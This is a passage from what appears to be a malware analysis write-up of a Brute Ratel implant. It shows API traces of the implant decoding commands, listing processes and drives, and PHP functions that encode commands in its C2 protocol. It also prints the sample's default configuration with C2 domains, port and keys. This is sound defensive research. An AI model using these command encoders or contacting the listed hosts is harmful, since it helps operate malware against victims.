[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000001001B2900
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+LLLySPwfZxLiwC6kHD5hsh9udygI3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000001001B73A0
[PAR] DWORD   *pcbBinary : 0x000000010218ECDC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x10203bea1]
```

**II. Execution**   

```html
[CNT] [350]
[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <WTSOpenServerA> in [wtsapi32.dll] 
[PAR] LPSTR pServerName : 0x00000001001BE040
[STR]       -> "localhost"
[RET] [0x10204809f]

[CNT] [351]
[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <WTSEnumerateProcessesA> in [wtsapi32.dll] 
[PAR] HANDLE              hServer       : 0x0000000100596200
[PAR] DWORD               Reserved      : 0x0
[PAR] DWORD               Version       : 0x1
[PAR] PWTS_PROCESS_INFOA* ppProcessInfo : 0x000000010218E7D8
[PAR] DWORD*              pCount        : 0x000000010218E7BC
[RET] [0x1020480c8]

[CNT] [366]
[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x0
[PAR] LPTSTR        lpName                  : 0x000000010218E7E0
[PAR] LPDWORD       cchName                 : 0x000000010218E7C0
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000010218E9E8
[PAR] LPDWORD       cchReferencedDomainName : 0x000000010218E7C0
[PAR] PSID_NAME_USE peUse                   : 0x000000010218E7C4
[RET] [0x102048193]

[CNT] [367]
[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x0
[PAR] LPTSTR        lpName                  : 0x000000010218E7E0
[PAR] LPDWORD       cchName                 : 0x000000010218E7C0
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000010218E9E8
[PAR] LPDWORD       cchReferencedDomainName : 0x000000010218E7C0
[PAR] PSID_NAME_USE peUse                   : 0x000000010218E7C4
[RET] [0x102048193]

[CNT] [368]
[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x0
[PAR] LPTSTR        lpName                  : 0x000000010218E7E0
[PAR] LPDWORD       cchName                 : 0x000000010218E7C0
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000010218E9E8
[PAR] LPDWORD       cchReferencedDomainName : 0x000000010218E7C0
[PAR] PSID_NAME_USE peUse                   : 0x000000010218E7C4
[RET] [0x102048193]

[...]
```

**III. Result**   

```html
[CNT] [459]
[PTP] [0x60c] [0x5b0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000001001AF0F0
[STR]        -> "F3D8"
[STR]           "localhost 31"
[STR]           "1|1884|home\user|taskhostex.exe"
[STR]           "1|1960|home\user|explorer.exe"
[STR]           "1|2744|home\user|VBoxTray.exe"
[STR]           "1|3040|home\user|Graphical Loader.exe"
[STR]           "1|3004|home\user|cmd.exe"
[STR]           "1|2908|home\user|conhost.exe"
[STR]           "1|1548|home\user|rundll32.exe"
[PAR] DWORD  cbBinary   : 0x1d0
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000001001DB560
[PAR] DWORD* pcchString : 0x000000010218E6DC
[RET] [0x10203e028]
```

<a id="UpdateConfig"></a>
# UpdateConfig  

This command will update the malware with a full, new configuration file.  

```php
function UpdateConfig($config)
{
	$cmd_id = "\xbf\xb6 $config";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

This is the unencrypted default configuration from the analysed sample :  

```
||0|5|5|100||||||||||||0|1
|greshunka.com,bazarunet.com,tiguanin.com
|8041
|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
|OV1T557KBIUECUM5
|S47EFEUO3D2O6641
|/bazar.php,/admin.php
|
|d0cf9d2be1473579e729382f5c2e22c6713503a7a74fecf866732f59399132fe
```


<a id="count_exec_cmd"></a>
# count_exec_cmd  

This command is 'supposed' to execute n times a given command with a timer between each execution :

![exec_loop](/docs/assets/images/bruteratel/command_exec_loop.jpg)

There is however a design flaw here since the function executing the command ends with an ExitThread :  

![ExitThread](/docs/assets/images/bruteratel/exit_thread.jpg)

The loop is broken by the ExitThread, invalidating the purpose of this command...  
Below a run exemple after removing the unnecessary Exit Thread :

```php
/*
	$p1 "int" cmd exec count
	$p2 "int" Sleep in sec
	$p3 "sring" 
*/
// ex : count_exec_cmd("3", "3", "\x09\x06")
function count_exec_cmd($count, $sleep, $cmd)
{
	$cmd_id = "\xa9\xb3 $count $sleep $cmd";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [4916]
[PTP] [0x7ec] [0x9cc] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000D2512D7D20
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ZenYSNMhHwLy1j2M"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000D2512EBB10
[PAR] DWORD   *pcbBinary : 0x000000D25320EC5C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xd25316bea1]
```

**II. Execution**   

```html
[CNT] [4959]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <GetLogicalDrives> in [KERNEL32.DLL] 
[RET] [0xd253174125]

[CNT] [4961]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000D2512D7F60
[STR]        -> "0906"
[STR]           "C:\"
[STR]           "D:\"
[STR]           "X:\"
[STR]           "Y:\"
[STR]           "Z:\"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000D2512E44C0
[PAR] DWORD* pcchString : 0x000000D25329EF0C
[RET] [0xd25316e028]

[CNT] [4962]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <WaitForSingleObjectEx> in [KERNEL32.DLL] 
[PAR] HANDLE hHandle        : 0xffffffff
[PAR] DWORD  dwMilliseconds : 0xbb8  // 3s
[PAR] BOOL   bAlertable     : 0x0
[RET] [0xd253181c8b]

[CNT] [5026]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <GetLogicalDrives> in [KERNEL32.DLL] 
[RET] [0xd253174125]

[CNT] [5028]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000D2512D7F60
[STR]        -> "0906"
[STR]           "C:\"
[STR]           "D:\"
[STR]           "X:\"
[STR]           "Y:\"
[STR]           "Z:\"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000D2512E4100
[PAR] DWORD* pcchString : 0x000000D25329EF0C
[RET] [0xd25316e028]

[CNT] [5029]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <WaitForSingleObjectEx> in [KERNEL32.DLL] 
[PAR] HANDLE hHandle        : 0xffffffff
[PAR] DWORD  dwMilliseconds : 0xbb8 
[PAR] BOOL   bAlertable     : 0x0
[RET] [0xd253181c8b]

[CNT] [5077]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <GetLogicalDrives> in [KERNEL32.DLL] 
[RET] [0xd253174125]

[CNT] [5079]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000D2512D7AE0
[STR]        -> "0906"
[STR]           "C:\"
[STR]           "D:\"
[STR]           "X:\"
[STR]           "Y:\"
[STR]           "Z:\"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000D2512E47E0
[PAR] DWORD* pcchString : 0x000000D25329EF0C
[RET] [0xd25316e028]

[CNT] [5080]
[PTP] [0x7ec] [0xac0] [c:\windows\system32\rundll32.exe]
[API] <WaitForSingleObjectEx> in [KERNEL32.DLL] 
[PAR] HANDLE hHandle        : 0xffffffff
[PAR] DWORD  dwMilliseconds : 0xbb8 
[PAR] BOOL   bAlertable     : 0x0
[RET] [0xd253181c8b]
```

**III. Result**   

```
A6D4
2 27520906
C:\
D:\
X:\
Y:\
Z:\
```
